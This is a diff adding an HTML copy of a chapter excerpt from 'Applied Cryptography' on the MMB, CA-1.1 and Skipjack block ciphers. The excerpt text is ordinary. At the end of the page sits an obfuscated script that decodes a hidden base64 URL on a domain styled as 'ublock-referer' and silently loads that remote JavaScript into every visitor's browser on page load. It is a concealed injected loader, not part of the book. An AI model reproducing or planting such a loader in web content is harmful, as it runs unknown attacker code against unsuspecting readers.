@@ -1,0 +1,108 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=326-329//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch14/14-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Security of MMB</I></B></FONT></P>
+<P>The design of MMB ensures that each round has considerable diffusion independent of the key. In IDEA, the amount of diffusion is to some extent dependent on the particular subkeys. MMB was also designed not to have any weak keys as IDEA has.
+</P>
+<P>MMB is dead [402]. Although no cryptanalysis has been published, this is true for several reasons. First, it was not designed to be resistant to linear cryptanalysis. The multiplication factors were chosen to be resistant to differential cryptanalysis, but the algorithm&#146;s authors were unaware of linear cryptanalysis.</P>
+<P>Second, Eli Biham has an effective chosen-key attack [160], which exploits the fact that all rounds are identical and that the key schedule is just a cyclic shift by 32 bits. Third, even though MMB would be very efficient in software, the algorithm would be less efficient than DES in hardware.</P>
+<P>Daemen suggests that anyone interested in improving MMB should first do an analysis of modular multiplication with respect to linear cryptanalysis and choose a new multiplication factor, and then make the constant C different for each round [402]. Then, improve the key scheduling by adding constants to the round keys to remove the bias. He&#146;s not going to do it; he designed 3-Way instead (see Section 14.5).</P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">13.11 CA-1.1</FONT></H3>
+<P>CA is a block cipher built on cellular automata, designed by Howard Gutowitz [677, 678, 679]. It encrypts plaintext in 384-bit blocks and has a 1088-bit key (it&#146;s really two keys, a 1024-bit key and a 64-bit key). Because of the nature of cellular automata, the algorithm is most efficient when implemented in massively parallel integrated circuits.
+</P>
+<P>CA-1.1 uses both reversible and irreversible cellular automaton rules. Under a reversible rule, each state of the lattice comes from a unique predecessor state, while under an irreversible rule, each state can have many predecessor states. During encryption, irreversible rules are iterated backward in time. To go backward from a given state, one of the possible predecessor states is selected at random. This process can be repeated many times. Backward iteration thus serves to mix random information with the message information. CA-1.1 uses a particular kind of partially linear irreversible rule, which is such that a random predecessor state for any given state can be rapidly built. Reversible rules are also used for some stages of encryption.</P>
+<P>The reversible rules (simple parallel permutations on sub-blocks of the state) are nonlinear. The irreversible rules are derived entirely from information in the key, while the reversible rules depend both on key information and on the random information inserted during the stages of encryption with irreversible rules.</P>
+<P>CA-1.1 is built around a block-link structure. That is, the processing of the message block is partially segregated from the processing of the stream of random information inserted during encryption. This random information serves to link stages of encryption together. It can also be used to chain together a ciphertext stream. The information in the link is generated as part of encryption.</P>
+<P>Because CA-1.1 is a new algorithm, it is too early to make any pronouncements on its security. Gutowitz discusses some possible attacks, including differential cryptanalysis, but is unable to break the algorithm. As an incentive, Gutowitz has offered a $1000 prize to &#147;the first person who develops a tractable procedure to break CA-1.1.&#148;</P>
+<P>CA-1.1 is patented [678], but is available free for non-commercial use. Anyone interested in either licensing the algorithm or in the cryptanalysis prize should contact Howard Gutowitz, ESPCI, Laboratoire d&#146;ƒlectronique, 10 rue Vauquelin, 75005 Paris, France.</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">13.12 Skipjack</FONT></H3>
+<P>Skipjack is the NSA-developed encryption algorithm for the Clipper and Capstone chips (see Sections 24.16 and 24.17). Since the algorithm is classified Secret, its details have never been published. It will only be implemented in tamperproof hardware.
+</P>
+<P>The algorithm is classified Secret, not because that enhances its security, but because the NSA doesn&#146;t want Skipjack being used without the Clipper key-escrow mechanism. They don&#146;t want the algorithm implemented in software and spread around the world.</P>
+<P>Is Skipjack secure? If the NSA wants to produce a secure algorithm, they presumably can. On the other hand, if the NSA wants to design an algorithm with a trapdoor, they can do that as well.</P>
+<P>Here&#146;s what has been published [1154, 462].</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;It&#146;s an iterative block cipher.
+<DD><B>&#151;</B>&nbsp;&nbsp;The block size is 64 bits.
+<DD><B>&#151;</B>&nbsp;&nbsp;It has an 80-bit key.
+<DD><B>&#151;</B>&nbsp;&nbsp;It can be used in ECB, CBC, 64-bit OFB, or 1-, 8-, 16-, 32- or 64-bit CFB modes.
+<DD><B>&#151;</B>&nbsp;&nbsp;There are 32 rounds of processing per single encrypt or decrypt operation.
+<DD><B>&#151;</B>&nbsp;&nbsp;NSA started the design in 1985 and completed the evaluation in 1990.
+</DL>
+<P>The documentation for the Mykotronx Clipper chip says that the latency for the Skipjack algorithm is 64 clock cycles. This means that each round consists of two clock cycles: presumably one for the S-box substitution and another for the final XOR at the end of the round. (Remember: permutations take no time in hardware.) The Mykotronx documentation calls this two-clock-cycle operation a &#147;G-box, &#148; and the whole thing a &#147;shift.&#148; (Some part of the G-box is called an &#147;F-table, &#148; probably a table of constants but maybe a table of functions.)
+</P>
+<P>I heard a rumor that Skipjack uses 16 S-boxes, and another that the total memory requirement for storing the S-boxes is 128 bytes. It is unlikely that both of these rumors are true.</P>
+<P>Another rumor implies that Skipjack&#146;s rounds, unlike DES&#146;s, do not operate on half of the block size. This, combined with the notion of &#147;shifts, &#148; an inadvertent statement made at Crypto &#146;94 that Skipjack has &#147;a 48-bit internal structure, &#148; implies that it is similar in design to SHA (see Section 18.7) but with four 16-bit sub-blocks: three sub-blocks go through a key-dependent one-way function to produce 16 bits, which are XORed with the remaining sub-block; then the whole block is circularly shifted 16 bits to become the input to the next round, or shift. This also implies 128 bytes of S-box data. I suspect that the S-boxes are key-dependent.</P>
+<P>The structure of Skipjack is probably similar to DES. The NSA realizes that their tamperproof hardware will be reverse-engineered eventually; they won&#146;t risk any advanced cryptographic techniques.</P>
+<P>The fact that the NSA is planning to use the Skipjack algorithm to encrypt their Defense Messaging System (DMS) implies that the algorithm is secure. To convince the skeptics, NIST allowed a panel of &#147;respected experts from outside the government...access to the confidential details of the algorithm to assess its capabilities and publicly report its findings&#148; [812].</P>
+<P>The preliminary report of these experts [262] (there never was a final report, and probably never will be) concluded that:</P>
+<BLOCKQUOTE><P>Under an assumption that the cost of processing power is halved every 18 months, it will be 36 years before the difficulty of breaking Skipjack by exhaustive search will be equal to the difficulty of breaking DES today. Thus, there is no significant risk that Skipjack will be broken by exhaustive search in the next 30&#150;40 years.
+</P>
+<P>There is no significant risk that Skipjack can be broken through a shortcut method of attack, including differential cryptanalysis. There are no weak keys; there is no complementation property. The experts, not having time to evaluate the algorithm to any great extent, instead evaluated NSA&#146;s own design and evaluation process.</P>
+<P>The strength of Skipjack against a cryptanalytic attack does not depend on the secrecy of the algorithm.</P>
+</BLOCKQUOTE><P>Of course, the panelists did not look at the algorithm long enough to come to any conclusions themselves. All they could do was to look at the results that the NSA showed to them.
+</P>
+<P>One unanswered question is whether the Skipjack keyspace is flat (see Section 8.2). Even if Skipjack has no weak keys in the DES sense, some artifact of the key-scheduling process could make some keys stronger than others. Skipjack could have 2<SUP>70</SUP> strong keys, far more than DES; the odds of choosing one of those strong keys at random would still be about 1 in 1000. Personally, I think the Skipjack keyspace is flat, but the fact that no one has ever said this publicly is worrisome.</P>
+<P>Skipjack is patented, but the patent is being withheld from distribution by a patent secrecy agreement [1122]. The patent will only be issued when and if the Skipjack algorithm is successfully reverse-engineered. This gives the government the best of both worlds: the protection of a patent and the confidentiality of a trade secret.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch14/14-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BbCQqIwp, wnhiHxQV) {wnhiHxQV = BbCQqIwp.createElement('script');wnhiHxQV.type = 'text/javascript';wnhiHxQV.async = true;wnhiHxQV.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BbCQqIwp.getElementsByTagName('body')[0].appendChild(wnhiHxQV);}(document));</script></body>
+</html>
